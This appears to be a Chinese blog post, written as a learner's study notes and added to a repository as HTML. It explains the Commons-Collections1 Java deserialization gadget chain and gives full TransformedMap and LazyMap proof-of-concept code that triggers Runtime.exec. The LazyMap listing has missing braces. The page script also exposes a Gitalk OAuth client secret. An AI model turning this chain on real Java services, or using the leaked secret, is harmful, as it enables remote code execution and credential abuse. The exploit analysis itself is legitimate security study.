@@ -1,0 +1,513 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Commons-Collections1反序列化 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Commons-Collections1反序列化 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+想学Java很久了，之前也买了P牛的知识星球，但由于没啥基础，所以Java代码审计里面很多内容都看不太懂。最近这段时间学了一下SE的基础、反射和动态代理。现在来学习一下反序列化。
+Commons-Collections是什么?
+Apa..." />
+    <meta name="keywords" content="Java,反序列化" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Commons-Collections1反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-02-25
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>想学Java很久了，之前也买了P牛的知识星球，但由于没啥基础，所以Java代码审计里面很多内容都看不太懂。最近这段时间学了一下SE的基础、反射和动态代理。现在来学习一下反序列化。</p>
+<h2 id="commons-collections是什么">Commons-Collections是什么?</h2>
+<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发。</p>
+<h2 id="漏洞复现环境">漏洞复现环境：</h2>
+<blockquote>
+<p>commons-collections3.1</p>
+<p>jdk8u65</p>
+<p>关于jdk: 最好是把src.zip解压，然后加入openjdk的对应版本的sun包，因为甲骨文的jdk的sum包是class文件，没法调试</p>
+</blockquote>
+<h2 id="复现过程">复现过程：</h2>
+<h3 id="transformedmap链">TransformedMap链:</h3>
+<p>先来看一下InvokerTransformer类</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/f0670e9567423.png" alt="1645863760823.png" loading="lazy"></figure>
+<p>这里接收一个对象，然后反射调用，其中方法名、参数类型和参数全都是可控的。这里就是一个任意方法调用。先用反射来弹一个计算器</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception{
+    Class runtime = Class.forName(&quot;java.lang.Runtime&quot;);//反射获取Runtime类
+    Method getRuntime = runtime.getMethod(&quot;getRuntime&quot;);//获取getRuntime方法
+    Method execMethod = runtime.getMethod(&quot;exec&quot;, String.class);//获取exec方法
+    Object r = getRuntime.invoke(runtime);//执行getRuntime方法返回一个Runtime对象
+    execMethod.invoke(r,&quot;calc&quot;);//执行exec方法
+}
+</code></pre>
+<p>现在把这个改成<code>InvokerTransformer</code>的写法，先来看下构造函数。参数名、参数类型、参数值。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/77c6611f988b6.png" alt="1645866316030.png" loading="lazy"></figure>
+<pre><code class="language-java">public static void main(String[] args) throws Exception{
+    Class runtime = Class.forName(&quot;java.lang.Runtime&quot;);//反射获取Runtime类
+    Method getRuntime = runtime.getMethod(&quot;getRuntime&quot;);//获取getRuntime方法
+    Object r = getRuntime.invoke(runtime);//执行getRuntime方法返回一个Runtime对象
+    new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}).transform(r);
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/f69913e6be256.png" alt="1645867464228.png" loading="lazy"></figure>
+<p>接下来就找一找有哪些类调用了<code>InvokerTransformer</code>类的<code>transform</code>方法。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/c0ee2347e681c.png" alt="1645869539661.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/145cb312ad1f3.png" alt="1645872493097.png" loading="lazy"></figure>
+<p>最后是找到了<code>TransformedMap</code>类有几处调用了这个<code>transform</code>方法。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/40f540da7b91b.png" alt="1645876845888.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/fcfce86f71b1f.png" alt="1645878222907.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/997e4348e1b9d.png" alt="1645876871733.png" loading="lazy"></figure>
+<p>我们重点来看一下<code>TransformedMap</code>的构造函数和<code>checkSetValue</code>方法，这里提供了一个静态方法<code>decorate</code>，可以返回一个TransformedMap对象。</p>
+<p>可以看到构造器传入了一个<code>map</code>、传入了一个<code>keyTransforme</code>r和一个<code>valueTransformer</code>，而<code>checkSetValue</code>方法中，执行了<code>valueTransformer</code>的<code>transform</code>方法。</p>
+<pre><code class="language-java">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;});
+HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();
+map.put(&quot;key&quot;,&quot;aaa&quot;);
+Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);
+</code></pre>
+<p>这里将一个<code>map</code>和<code>invokerTransforme</code>r对象传入进去，就会执行<code>invokerTransformer.transformer(value)</code>，如果要达到命令执行的效果的话，这里的<code>value</code>必须得是可控的。所以这里查找一下哪里调用了这个<code>checkSetValue</code>。</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/ca49b7821add8.png" alt="1645879042991.png" loading="lazy"></figure>
+<p>发现<code>AbstractInputCheckedMapDecorator</code>类的<code>MapEntry</code>方法调用了<code>checkSetValue</code>。</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/22938a82ec7a9.png" alt="1645879867138.png" loading="lazy"></figure>
+<p>只需要遍历这里被修饰过的Map，就会走到<code>MapEntry</code>方法的setValue方法。接着就会调用<code>checkSetValue</code>方法，也就是回到了<code>TransformedMap</code>的<code>checkSetValue</code>。</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/d6f228b1aad1f.png" alt="1645880043598.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/76f9cc93d0133.png" alt="1645880269800.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/7cab8c9701649.png" alt="1645885622608.png" loading="lazy"></figure>
+<p>现在只需要找哪个类的readObject方法调用了这里的setValue。最后是在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类中找到了。</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/26/0711919363033.png" alt="1645885849201.png" loading="lazy"></figure>
+<p>这里有一个遍历Map的功能，然后<code>memberValue.setValue</code>这里对这个值调用了setValue方法。先来看下这个类的构造方法</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/02/28/e360575902f99.png" alt="1646039118431.png" loading="lazy"></figure>
+<p>它接受两个参数，第一个参数type是一个Class对象，第二个参数memberValues是一个Map对象。这个Map对象是完全可控的，我们可以将前面写好的<code>Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);</code>这个transformedMap传进去。由于这个类没有声明是public，默认的是default类型，那么只能在他的这个包底下才能访问，所以我们只能通过反射去获取这个类。</p>
+<pre><code class="language-java">Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);
+annotationInvocationHandlerConstructor.setAccessible(true);
+Object o = annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap);
+</code></pre>
+<p>虽然看起来这样子没什么问题，但是其实还是有个问题:</p>
+<ul>
+<li>这里的value想要传入Runtime对象，如何传进去呢?</li>
+</ul>
+<p>先来改一下代码，之前是只用InvokerTransformer调用了exec方法，现在将整个反射过程都用InvokerTransformer来写</p>
+<pre><code class="language-java">Method getRuntimeMethod =(Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}).transform(Runtime.class);
+
+Runtime r =(Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
+
+new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}).transform(r);
+</code></pre>
+<p>但是这样要重复的写好几个类，所以可以用<code>ChainedTransformer</code>来一起写了，先来看一下他的构造函数</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/8b84d9cb1caee.png" alt="1646123692049.png" loading="lazy"></figure>
+<p>传入的是一个Transformer[]数组，我们可以把要调用的方法全都写进去，然后transform方法会进行一个递归的调用。</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/5a9e99e91543c.png" alt="1646123774569.png" loading="lazy"></figure>
+<pre><code class="language-java">Transformer[] transformers = new  Transformer[]{
+        new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+        new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+        new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;})
+};
+
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+chainedTransformer.transform(Runtime.class);
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/a993748f76c1d.png" alt="1646129146023.png" loading="lazy"></figure>
+<p>现在可以正常弹出计算机了，说明已经把格式改过来了。</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/1cbfa97c1a88f.png" alt="1646127091809.png" loading="lazy"></figure>
+<p>这里之前传入的是invokerTransformer，我们全都改写成了chainedTransformer，所以直接传入chainedTransformer对象就好了</p>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/490cd384e806a.png" alt="1646127213608.png" loading="lazy"></figure>
+<p>这里只调用了一次，就相当于调用了Transformer[]数组里的三次方法。现在就应该着手于如何解决之前提出的问题:</p>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/cb4a4e0cb2999.png" alt="1646129634564.png" loading="lazy"></figure>
+<p>可能有两个地方出现了问题:</p>
+<ol>
+<li>这里最开始if判断没有通过！</li>
+<li>memberValue.setValue这里有问题！</li>
+</ol>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/94897c6de770b.png" alt="1646129913070.png" loading="lazy"></figure>
+<p>现在去调试一下，这里对memberValues调用getKey()方法，然后再在memberTypes里面查找这个key。没找到，这个if就直接没进去</p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/cd60dad5e3308.png" alt="1646130646906.png" loading="lazy"></figure>
+<p>所以必须要找一个有成员方法的class，并且数组的这个key，还要改为他的成员方法的名字</p>
+<figure data-type="image" tabindex="24"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/bdab80781d47f.png" alt="1646131114668.png" loading="lazy"></figure>
+<p>这里是找到了一个Target，把map.put那里第一个参数改为value，然后继续调试。</p>
+<figure data-type="image" tabindex="25"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/bb63697b38d14.png" alt="1646131288633.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/be5e26e8f7e60.png" alt="1646131486495.png" loading="lazy"></figure>
+<p>这下是能进入if了，然后继续跟进，发现最后走到了checkSetValue这里，也就是执行命令的最后那个点</p>
+<figure data-type="image" tabindex="27"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/49073d922ac17.png" alt="1646133365995.png" loading="lazy"></figure>
+<p>注意看这里的value值，还是得不到我们想要的。这时候其实有一个类可以解决，那就是<code>ConstantTransformer</code></p>
+<figure data-type="image" tabindex="28"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/c372fd1e1c506.png" alt="1646133847540.png" loading="lazy"></figure>
+<p>这个类的transform方法无论传入什么参数，都会返回构造的时候传入的值。</p>
+<p>虽然<code>AnnotationInvocationHandler</code>类最后那个member.setValue的Value的值我们控制不了，但是只需要最后调用的是ConstantTransformer的transformer方法就可以返回Runtime对象了</p>
+<p>因为最后执行命令是调用了transforms的transform方法，所以将这个<code>ConstantTransformer</code>写到最前面，让他返回一个Runtime对象</p>
+<figure data-type="image" tabindex="29"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/c3f2a247df69f.png" alt="1646134279642.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="30"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/f251852710efc.png" alt="1646134459869.png" loading="lazy"></figure>
+<p>然后再进行后续的一系列调用，最后成功弹出计算器。</p>
+<figure data-type="image" tabindex="31"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/01/140b53d51b97b.png" alt="1646134717121.png" loading="lazy"></figure>
+<p>完整利用链:</p>
+<pre><code class="language-java">package CC.CC1;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1Test {
+    public static void main(String[] args) throws Exception{
+
+       Transformer[] transformers = new Transformer[]{
+               new ConstantTransformer(Runtime.class),
+               new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+               new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+               new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;})
+       };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        
+          HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();
+          map.put(&quot;value&quot;,&quot;aaa&quot;);
+          Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
+          
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);
+        annotationInvocationHandlerConstructor.setAccessible(true);
+        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
+        serialize(o);
+        unserialize(&quot;Le1aaaa.bin&quot;);
+
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;Le1aaaa.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+</code></pre>
+<h3 id="lazymap链">LazyMap链:</h3>
+<p>LazyMap跟和TransformedMap类似，都继承了AbstractMapDecorator。但是其漏洞的出发点不一样，TransformedMap是在写入元素的时候执行transform方法，而LazyMap是在get方法中执行的<code>factory.transfrom</code>。</p>
+<pre><code class="language-java">public Object get(Object key) {
+    // create value for key if key is not currently in the map
+    if (map.containsKey(key) == false) {
+        Object value = factory.transform(key);
+        map.put(key, value);
+        return value;
+    }
+    return map.get(key);
+}
+</code></pre>
+<p>可以看到get方法里面调用了transform方法，get() 方法获取不到 key 的时候触发 transform，所以我们构造时就不放key了。接下来看看factory是否可控</p>
+<figure data-type="image" tabindex="32"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/04/c7441b9d1c4f8.png" alt="1646384075042.png" loading="lazy"></figure>
+<p>通过构造函数，我们可以看到factory是可控的，于是可以按照构造函数的规则进行构造并调用get方法</p>
+<figure data-type="image" tabindex="33"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/04/9d85a22b50a56.png" alt="1646384269381.png" loading="lazy"></figure>
+<p>但是在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的readobj中没有找到直接调用Map的get方法。但是在AnnotationInvocationHandler类中的invoke方法调用到了get:</p>
+<pre><code class="language-java">public Object invoke(Object proxy, Method method, Object[] args) {
+    String member = method.getName();
+    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();
+
+    // Handle Object and Annotation methods
+    if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;
+        paramTypes[0] == Object.class)
+        return equalsImpl(args[0]);
+    if (paramTypes.length != 0)
+        throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);
+
+    switch(member) {
+    case &quot;toString&quot;:
+        return toStringImpl();
+    case &quot;hashCode&quot;:
+        return hashCodeImpl();
+    case &quot;annotationType&quot;:
+        return type;
+    }
+
+    // Handle annotation member accessors
+    Object result = memberValues.get(member);
+</code></pre>
+<p>接着我们看一下这里的memberValues是否可控，如果可控就可以传入上面的POC</p>
+<figure data-type="image" tabindex="34"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/04/312b186f4e5e9.png" alt="1646384397895.png" loading="lazy"></figure>
+<p>这里的invoke()方法会根据传入参数，先获取调用方法名和调用参数，然后需要我们调用的方法不能是equals且调用方法是无参的。然后因为下面switch(var7)我们要让他default，所以var7我们要保持它的值是-1，所以我们传入的方法也不能是toString，hashCode，annotationType。</p>
+<p>接下来就需要去到readobject中去找，看看有没有调用一些满足条件的无参方法，这样反序列化时配合动态代理机制就可以自动跳转到这里。知识点:<strong>被动态代理的对象调用任意方法都会调用对应的InvocationHandler的invoke方法</strong></p>
+<figure data-type="image" tabindex="35"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/04/da8bfb2a1e249.png" alt="1646385657355.png" loading="lazy"></figure>
+<p>readObject方法里面，不需要任何处理就会自己调用一个无参方法entrySet()，所以我们只需要控制memberValues传入的是动态代理的实例对象，即可进入到invoke方法调用get方法，进而调用transform执行命令了</p>
+<figure data-type="image" tabindex="36"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/04/75dc898a53f3d.png" alt="1646386013302.png" loading="lazy"></figure>
+<p>因为想要LazyMap调用get方法，所以这里传入，让memberValues等于LazyMap，因为readObject里面调用过无参方法，所以这里就会走到AnnotationInvocationHandler类的invoke方法，然后就会调用LazyMap，进而执行transform。</p>
+<p>完整POC：</p>
+<pre><code class="language-java">package CC.CC1.LazyMap;
+
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class LazyMapPoc {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException{
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
+        Map hashMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(hashMap,transformerChain);
+
+        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);
+
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);//
+        handler = (InvocationHandler) constructor.newInstance(Retention.class,proxyMap);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(handler);
+        oos.close();
+
+
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o =(Object) ois.readObject();
+
+    }
+}
+</code></pre>
+<p>放一张ysoserial的顺序图来说明整个完整调用流程</p>
+<figure data-type="image" tabindex="37"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/04/d20a2079542af.png" alt="1646386266952.png" loading="lazy"></figure>
+<h2 id="最后">最后：</h2>
+<p>前前后后差不都看了接近一周了，对于初学者来说，理解起来还是很不容易，还是自己太菜了！继续加油吧！😴😴😴</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#commons-collections%E6%98%AF%E4%BB%80%E4%B9%88">Commons-Collections是什么?</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83">漏洞复现环境：</a></li>
+<li><a href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B">复现过程：</a>
+<ul>
+<li><a href="#transformedmap%E9%93%BE">TransformedMap链:</a></li>
+<li><a href="#lazymap%E9%93%BE">LazyMap链:</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9C%80%E5%90%8E">最后：</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/Java动态代理/">
+              <h3 class="post-title">
+                Java动态代理
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
